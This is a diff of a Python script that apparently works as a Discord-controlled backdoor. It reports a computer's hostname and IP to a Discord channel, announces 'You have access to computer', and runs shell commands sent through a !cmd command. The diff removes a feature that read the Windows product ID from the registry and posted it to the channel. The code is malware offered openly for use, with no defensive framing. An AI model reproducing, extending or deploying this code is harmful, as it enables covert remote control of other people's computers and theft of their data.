@@ -5,7 +5,7 @@ import subprocess
 import winreg
 
 
-TOKEN = "HERE TOKEN BOT" # <---- Discord Bot Token
+TOKEN = "Token" # <---- Discord Bot Token
 ip = socket.gethostbyname(socket.gethostname())
 intents = discord.Intents.default()
 intents.message_content = True
@@ -31,7 +31,7 @@ async def on_ready():
     else:
         channel_ref = await guild.create_text_channel(name)
 
-    await channel_ref.send(f"You have access to computer. type !cmd (command) to execute command in cmd. Type !productid to show a productid activation key license. Name: {name} IP: {ip}")
+    await channel_ref.send(f"You have access to computer. type !cmd (command) to execute command in cmd. Name: {name} IP: {ip}")
 
 @client.event
 async def on_message(message):
@@ -65,16 +65,5 @@ async def on_message(message):
 
         except Exception as e:
             await message.channel.send(f"Error: {e}")
-
-    elif message.content == "!productid":
-
-        def get_product_id():
-         key = winreg.OpenKey(
-            winreg.HKEY_LOCAL_MACHINE,
-            r"SOFTWARE\Microsoft\Windows NT\CurrentVersion"
-        )
-        value, _ = winreg.QueryValueEx(key, "ProductId")
-        return value
-        await message.channel.send(get_product_id())
 
 client.run(TOKEN)
